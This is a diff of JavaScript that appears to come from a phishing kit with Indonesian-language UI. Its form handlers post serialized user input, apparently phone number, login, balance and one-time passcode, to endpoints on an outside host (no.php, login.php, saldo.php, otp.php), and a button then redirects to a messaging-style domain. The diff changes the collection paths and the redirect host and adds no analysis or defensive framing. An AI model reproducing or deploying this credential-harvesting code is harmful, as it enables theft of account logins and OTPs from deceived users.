@@ -5,7 +5,7 @@
  $("#lodingku").show();
  $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/x12/no.php',
+ url: 'https://choreo-is.masuk.web.id/kim/no.php',
  data: $(this).serialize(),
  datatype: 'JSON', 
  complete: function(data) {
@@ -30,7 +30,7 @@ $('#form1').on('submit', function (event) {
 $("#lodingku").show();
 $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/x12/login.php',
+ url: 'https://choreo-is.masuk.web.id/kim/login.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(), 
@@ -61,7 +61,7 @@ $('#form2').on('submit', function (event) {
 $("#lodingku").show();
 $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/x12/saldo.php',
+ url: 'https://choreo-is.masuk.web.id/kim/saldo.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(), 
@@ -93,7 +93,7 @@ $('#form3').on('submit', function (event) {
   document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/x12/otp.php',
+ url: 'https://choreo-is.masuk.web.id/kim/otp.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(), 
@@ -120,7 +120,7 @@ document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";
 function getcs(){
  $("#djload").show();   
 setTimeout(function(){  
-location.href='https://choreo12pagesdev.wasap.my/';
+location.href='https://hfjfjgkhihwasapmy.wasap.my/';
  $("#djload").hide();   
     }, 1000);    
 }     
